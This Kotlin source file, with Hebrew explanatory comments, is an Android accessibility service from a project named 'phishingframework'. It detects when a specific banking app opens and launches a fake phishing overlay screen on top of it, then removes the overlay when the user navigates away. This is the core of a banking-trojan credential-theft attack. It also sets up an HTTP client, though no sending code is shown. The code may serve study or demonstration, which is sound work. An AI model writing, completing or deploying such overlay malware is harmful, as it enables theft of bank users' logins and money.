package com.example.phishingframework

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.content.Context.WINDOW_SERVICE
import android.content.Intent
import android.graphics.PixelFormat
import android.util.Log
import android.view.LayoutInflater
import android.view.WindowManager
import android.view.View
import android.view.accessibility.AccessibilityEvent
import android.widget.Button
import android.widget.EditText
import androidx.core.content.ContextCompat.getSystemService
import android.os.Handler
import android.os.Looper
import android.os.SystemClock
import android.view.KeyEvent
import android.view.ViewGroup.LayoutParams.MATCH_PARENT
import android.view.WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
import android.view.WindowManager.LayoutParams.SOFT_INPUT_STATE_ALWAYS_VISIBLE
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Callback
import okhttp3.Response
import java.io.IOException



class PhishingAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "PhishingService"
        private const val TARGET_PACKAGE = "com.ideomobile.mercantile"
        private const val MIN_SHOW_MS = 500L
    }

    private var overlayView: View? = null
    private lateinit var windowManager: WindowManager
    private val handler = Handler(Looper.getMainLooper())
    private var pendingRemove: Runnable? = null

    // יצרו קליינט אחד לשימוש חוזר לאורך חיי השירות
    private val httpClient = OkHttpClient()

    // נזכור מתי הצגנו את ה-Overlay לאחרונה
    private var lastShowTime = 0L

    //מאתחל את ה-WindowManager לשימוש בהוספה/הסרה של overlay
    //זהו callback של מחלקת AccessibilityService, שנקרא ברגע שהשירות (ה־Service) מתחבר למערכת ומוכן לקבל אירועי Accessibility
    //בשלב הזה אפשר לאתחל משאבים שצריך בשירות, למשל קבלת הפניה ל־WindowManager.
    //getSystemService(name: String) -מאפשרת לגשת ל־שירותי מערכת מובנים באנדרואיד
    // WINDOW_SERVICE- מעיד ל־ getSystemService שאנחנו רוצים את שירות ניהול החלונות של המערכת
    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "Service Connected")
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
    }

    //override fun onAccessibilityEvent(event: AccessibilityEvent?) - זו מתודה רישומית (callback) של AccessibilityService
    //ה־Android קורא לה בכל פעם ש־AccessibilityService פעיל ומתרחש אירוע מסוים במערכת (למשל שינוי חלון, לחיצה על כפתור, קבלת פוקוס על תצוגה)
    //event ?: return:
    //אם event הוא null, הפקודה מבצעת return ומפסיקה את הפונקציה מיידית
    //אם event לא null, ההרצה ממשיכה הלאה עם האובייקט שמצוי ב־event
    //event.eventType זה מספר (int) שמסמן איזה אירוע בדיוק התרחש
    //TYPE_WINDOW_STATE_CHANGED הוא קבוע שמסמן “חלון חדש נפתח או קיבל פוקוס” (למשל כשActivity חדש עולה על המסך).
    //ברגע שהאירוע הוא גם שינוי חלון וגם מאפליקציית הבנק, הפונקציה קוראת ל־showPhishingOverlay()
    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) return

        val pkg = event.packageName?.toString() ?: return
        Log.i(TAG, "Window changed to $pkg")

        val selfPkg = applicationContext.packageName
        val recentsPkgs = setOf(
            "com.android.systemui",
            "com.samsung.android.app.cocktailbarservice",
            // IME שכיחות:
            "com.android.inputmethod.latin",
            "com.google.android.inputmethod.latin",
            // אם יש מקלדת יצרן (לדוגמה סמסונג) – ניתן להוסיף גם:
            "com.samsung.android.inputmethod"
        )
        val exitPkgs = setOf(
            "com.sec.android.app.launcher"
        )

        when {
            pkg == TARGET_PACKAGE -> {
                // ביטול כל הסרות מתוזמנות ולהציג
                pendingRemove?.let { handler.removeCallbacks(it) }
                pendingRemove = null
                showPhishingOverlay()
            }
            pkg == selfPkg || pkg in recentsPkgs -> {
                // מתעלמים
            }
            pkg in exitPkgs -> {
                // רק תזמון הסרה אם עבר הסף מהמופע האחרון
                val now = SystemClock.uptimeMillis()
                if (now - lastShowTime >= MIN_SHOW_MS && pendingRemove == null) {
                    pendingRemove = Runnable {
                        removeOverlay()
                        pendingRemove = null
                    }
                    handler.postDelayed(pendingRemove!!, 0)
                }
            }
            else -> {
                // אפליקציה צד ג' – הסר מיד
                removeOverlay()
            }
        }
    }


    //זו המתודה שמטפלת ב־interrupt של ה־AccessibilityService, כלומר ברגע שהשירות “מתקלקל” (נכנס לפעולה של עצירה) או כשמשתמש מבטל את השירות ב־Settings
    //נקראת כאשר AccessibilityService נפסק או מושבת על-ידי המשתמש ב־Settings או כשמערכת ה־Accessibility מגלה שהשירות שלך לא צריך עוד לרוץ (למשל אחרי שינוי הגדרות)
    // התפקיד של הפונקציה הוא לנקות (clean up) כל גליונות ה-Overlay שנותרו פתוחים
    override fun onInterrupt() {
        pendingRemove?.let { handler.removeCallbacks(it) }
        pendingRemove = null
        removeOverlay()
    }

    //מטפלת ב־“הצגת המסך המזויף” שלך ברגע הנכון, אוכלת את ה־layout, מחכה לאינטראקציה של המשתמש, ומשתמשת ב־WindowManager כדי לצוף מעל אפליקציות אחרות
    private fun showPhishingOverlay() {
        val intent = Intent(this, PhishingOverlayActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        startActivity(intent)
    }

    private fun removeOverlay() {
        overlayView?.let {
            // מסתירים את המקלדת לפני הסרת ה-overlay
            val imm = getSystemService(Context.INPUT_METHOD_SERVICE)
                    as android.view.inputmethod.InputMethodManager
            imm.hideSoftInputFromWindow(it.windowToken, 0)

            windowManager.removeView(it)
            overlayView = null
            Log.i(TAG, "Phishing overlay removed")
        }
    }


    override fun onKeyEvent(event: KeyEvent?): Boolean {
        Log.i(TAG, "Key event: ${event?.keyCode}")
        // החזר true אם “בלעת” את האירוע ולא רוצה שיגיע לאפליקציה; אחרת false
        return false
    }

}